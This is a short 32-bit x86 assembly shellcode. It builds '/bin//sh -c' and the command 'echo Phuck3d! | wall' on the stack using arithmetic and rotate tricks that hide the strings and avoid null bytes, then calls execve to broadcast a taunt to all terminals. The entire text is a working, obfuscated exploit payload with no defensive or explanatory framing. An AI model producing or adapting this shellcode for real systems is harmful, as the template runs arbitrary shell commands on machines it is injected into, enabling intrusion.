
global _start

section .text

_start:
	; execve syscall
	; eax = 11 (execve), ebx = address of '/bin//sh'
	;   ecx =maddress of args


	; esi = 'echo Phuck3d! | wall'
	push esi
	mov eax, 0x22222222
	add eax, 0x4a4a3f55
	push eax
	add eax, 0xb40fbeaa
	push eax
	add eax, 0x43b74b42
	push eax
	add eax, 0x1134e4bd
	push eax
	mov eax, 0xf6863656
	ror eax, 4
	push eax
	mov edi, esp

	push esi
	push word 0x632d
	mov edx, esp

	; ebx = '/bin//sh'
	push esi
	mov eax, 0xf68732f2
	rol eax, 4
	push eax
	mov eax, 0xf6e69622
	rol eax, 4
	push eax
	mov ebx, esp

	push esi
	push edi
	push edx
	push ebx
	mov ecx, esp

	push byte 11
	pop eax
	int 0x80
